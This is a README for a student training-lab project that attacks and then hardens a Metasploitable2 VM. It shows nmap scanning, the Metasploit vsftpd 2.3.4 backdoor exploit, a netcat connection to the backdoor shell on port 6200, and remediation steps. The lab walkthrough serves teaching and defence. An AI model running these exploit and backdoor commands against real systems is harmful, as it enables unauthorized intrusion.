# NTI Penetration Testing & Security Hardening Project

## 🛡️ Penetration Testing & Security Hardening

A comprehensive cybersecurity project demonstrating the complete attack-to-defense lifecycle, from initial reconnaissance to system hardening and verification.

## 📋 Project Overview

This project showcases practical cybersecurity skills through:
- Offensive security techniques using industry-standard tools
- Vulnerability exploitation in a controlled environment
- Defensive countermeasures and incident response
- Complete security assessment and remediation workflow

## 🎯 Project Objectives

- **Offensive Phase**: Demonstrate penetration testing methodologies
- **Defensive Phase**: Implement security hardening and vulnerability remediation
- **Documentation**: Provide comprehensive attack and defense analysis
- **Verification**: Validate security improvements through testing

## 🛠️ Tools & Technologies

### Attack Tools
- **Kali Linux** - Primary penetration testing platform
- **Nmap** - Network reconnaissance and port scanning
- **Metasploit Framework** - Vulnerability exploitation toolkit
- **Netcat** - Network connection and backdoor access

### Target Environment
- **Metasploitable2** - Intentionally vulnerable Linux system
- **vsftpd service** - Target service with known backdoor vulnerability

### Defense Tools
- **System Configuration** - Service hardening and configuration changes
- **Process Management** - Service termination and control
- **Network Verification** - Post-defense security validation

## 🔍 Attack Phase Methodology

### 1. Network Reconnaissance
```bash
# Network interface configuration
ifconfig

# Connectivity verification
ping 192.168.100.25

# Port scanning and service discovery
nmap -sV 192.168.100.25
```

### 2. Vulnerability Assessment
- Identified open FTP service (vsftpd 2.3.4)
- Located known backdoor vulnerability
- Confirmed exploitable service version

### 3. Exploitation
```bash
# Metasploit Framework
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.25
exploit
```

### 4. Post-Exploitation
```bash
# Manual backdoor connection
nc 192.168.100.25 6200

# System enumeration
id
whoami
uname -a
```

## 🛡️ Defense Phase Implementation

### 1. Immediate Response
```bash
# Identify malicious process
ps aux | grep vsftpd

# Terminate compromised service
sudo kill <PID>
```

### 2. System Hardening
```bash
# Configuration modification
sudo nano /etc/vsftpd.conf
# Changed: listen=YES to listen=NO
```

### 3. Verification & Recovery
```bash
# System reboot for changes
sudo reboot

# Security validation scan
nmap -p 21,6200 192.168.100.25
```

## 📊 Results & Impact

### Attack Success Metrics
- ✅ Successful network reconnaissance
- ✅ Vulnerability identification and exploitation
- ✅ Root-level system compromise achieved
- ✅ Complete post-exploitation access

### Defense Success Metrics
- ✅ Immediate threat containment
- ✅ Permanent vulnerability remediation
- ✅ System configuration hardening
- ✅ Verified security improvement

## 🧪 Lab Environment

**Network Configuration:**
- Attacker: Kali Linux (192.168.100.24)
- Target: Metasploitable2 (192.168.100.25)
- Isolated network environment for safe testing

## 🤝 Team Members

**Project Contributors:**
- **Ganna Mohamed Abdelrahman**
- **Salma Ayman**
- **Aya Hisham**
- **Habiba**

## 🎓 Learning Outcomes

- **Penetration Testing**: Hands-on experience with ethical hacking tools
- **Vulnerability Assessment**: Systematic approach to security testing
- **Incident Response**: Rapid threat containment and remediation
- **System Hardening**: Proactive security configuration management
- **Documentation**: Professional cybersecurity reporting skills

## ⚠️ Ethical Use & Disclaimer

This project was conducted for **educational purposes only** within:
- **Authorized testing environment** (NTI training lab)
- **Controlled network infrastructure**
- **Supervised educational setting**
- **Proper legal authorization**

**Important**: Unauthorized penetration testing is illegal. All techniques demonstrated here should only be used in authorized environments with proper permissions.

## 🔧 Technical Requirements

### Prerequisites
- VMware for virtualization
- Kali Linux distribution
- Metasploitable2 vulnerable system
- Isolated network configuration
- Basic Linux command line knowledge

### Setup Instructions
1. Configure virtual network environment
2. Deploy Kali Linux and Metasploitable2 VMs
3. Verify network connectivity between systems
4. Ensure proper isolation from production networks

## 📈 Project Timeline

1. **Environment Setup** - Lab configuration and system deployment
2. **Reconnaissance Phase** - Network mapping and service discovery
3. **Exploitation Phase** - Vulnerability assessment and exploitation
4. **Post-Exploitation** - System access and enumeration
5. **Defense Implementation** - Incident response and hardening
6. **Verification** - Security validation and documentation

## 🎖️ Certifications & Training

This project was completed as part of the **National Telecommunications Institute (NTI)** cybersecurity training program, demonstrating practical skills in:
- Ethical hacking methodologies
- Vulnerability assessment techniques
- Incident response procedures
- Security hardening practices

---

**Note**: This project demonstrates the critical importance of both offensive and defensive cybersecurity skills in building robust security programs. The complete attack-to-defense workflow showcases real-world incident response capabilities.
